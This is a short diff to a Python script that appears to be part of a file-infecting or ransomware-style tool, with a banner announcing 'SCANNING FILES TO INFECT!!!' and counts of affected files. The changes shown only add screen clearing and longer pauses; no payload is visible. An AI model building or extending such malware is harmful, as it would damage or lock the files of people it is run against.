@@ -1,4 +1,4 @@
-from os import listdir
+from os import listdir, system
 from os.path import isdir, isfile, splitext
 from getpass import getuser
 from time import sleep
@@ -43,7 +43,8 @@ def get_dictionary(silent=False):
 # Funcion Verbose del programa - Salida por consola
 def print_scan():
     print(banner)
-    sleep(0.5)
+    sleep(2)
+    system('clear')
     print("""
         **************************************
         *|    SCANNING FILES TO INFECT!!!   |*
@@ -74,6 +75,9 @@ def print_scan():
     {}""".format(num_files))
     print("""-X- ERROR FILES - NO AFFECTED -*-
     {}""".format(num_error))
+    sleep(2)
+    system('clear')
+
 
 # Funcion de listado/escaneo de Directorio y Subdirectorios
 def scan_dir(dir=None, silent=False):
